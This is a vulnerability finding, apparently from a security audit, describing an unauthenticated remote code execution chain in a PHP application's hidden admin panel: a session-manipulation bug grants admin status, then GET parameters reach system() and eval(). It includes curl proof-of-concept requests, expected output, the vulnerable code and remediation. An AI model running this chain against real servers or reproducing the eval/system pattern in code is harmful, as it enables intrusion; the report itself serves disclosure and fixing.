# Vulnerability: Remote Code Execution — Admin Panel system() and eval()

## Summary
The `s3cretadm1n/index.php` endpoint exposes `system(get('c'))` at line 19 and `eval(get('p'))` at line 22, which execute arbitrary OS commands and PHP code respectively. While guarded by `isAdmin()`, this check can be bypassed via the session manipulation vulnerability in `save_session.php` (VULN-001). When chained, an unauthenticated attacker achieves full Remote Code Execution.

## Confidence
High

## Authentication Requirement
Unauthenticated (via session manipulation chain with VULN-001)

## Attack Surface Location
- **Endpoint:** `GET /s3cretadm1n/index.php?c=<cmd>` or `GET /s3cretadm1n/index.php?p=<php>`
- **Handler:** `s3cretadm1n/index.php:1-24`
- **Middleware / Guards:** AumWAF, `isAdmin()` check (bypassable via VULN-001)

## Attack Chain
1. **Initial access:** Attacker sends `GET /save_session.php?debug=1&admin=1` to set `$_SESSION['admin'] = 1` (see VULN-001). No authentication required.
2. **Endpoint interaction:** Attacker accesses `s3cretadm1n/index.php` with the same session cookie. The `isAdmin()` check passes because `$_SESSION['admin']` is set.
3. **Malicious input:** `c` GET param = `id` (OS command) or `p` GET param = `phpinfo()` (PHP code).
4. **Sink execution:** `system(get('c'))` at line 19 executes the OS command; `eval(get('p'))` at line 22 executes the PHP code.
5. **Post-exploitation:** Attacker has full RCE — can read files, write webshells, exfiltrate data, pivot internally.
6. **Final impact:** Full Remote Code Execution as the web server user.

## Data Flow
- **Source (user input):** `$_GET['c']`, `$_GET['p']`
- **Sink:** `system()` at `s3cretadm1n/index.php:19`, `eval()` at `s3cretadm1n/index.php:22`

```
$_GET['c'] → get('c') [common.php:28-29] → system(get('c')) [s3cretadm1n/index.php:19]
$_GET['p'] → get('p') [common.php:28-29] → eval(get('p')) [s3cretadm1n/index.php:22]
```

## Proof of Concept

### Prerequisites
- None when chained with VULN-001 (session manipulation).

### Exploit Request — Full RCE Chain (Unauthenticated)
```bash
# Step 1: Set admin session
curl -v -c cookies.txt "http://{{TARGET_HOST}}/save_session.php?debug=1&admin=1"

# Step 2: Execute OS command via system()
curl -b cookies.txt "http://{{TARGET_HOST}}/s3cretadm1n/index.php?c=id"

# Step 3: Execute PHP code via eval()
curl -b cookies.txt "http://{{TARGET_HOST}}/s3cretadm1n/index.php?p=system('whoami');"
```

### Expected Vulnerable Response
**Step 2:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 3:**
```
www-data
```

### Expected Patched Response
After removing `system()` and `eval()`, the admin panel returns only static content without executing user input.

### Impact Demonstration
Full RCE: attacker can execute arbitrary OS commands and PHP code, read/write files, install backdoors, exfiltrate all data, and pivot to internal systems.

## Affected Code
```php
// s3cretadm1n/index.php:18-23
if(get('c')) {
    system(get('c'));
}
if(get('p')) {
    eval(get('p'));
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The `isAdmin()` guard checks `$_SESSION['admin']`, which can be set by any unauthenticated user via `save_session.php` (VULN-001). The `system()` and `eval()` sinks are directly reachable.
- **Impact attack — FAILED to kill.** `system()` and `eval()` are the most dangerous sinks possible — full RCE.
- **Validity attack — FAILED to kill.** No sanitization, no escaping, no allowlist on the `c` or `p` parameters.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Remove `system()` and `eval()` entirely. Delete or disable the admin panel in production:
```php
// Remove these lines entirely:
if(get('c')) { system(get('c')); }
if(get('p')) { eval(get('p')); }
```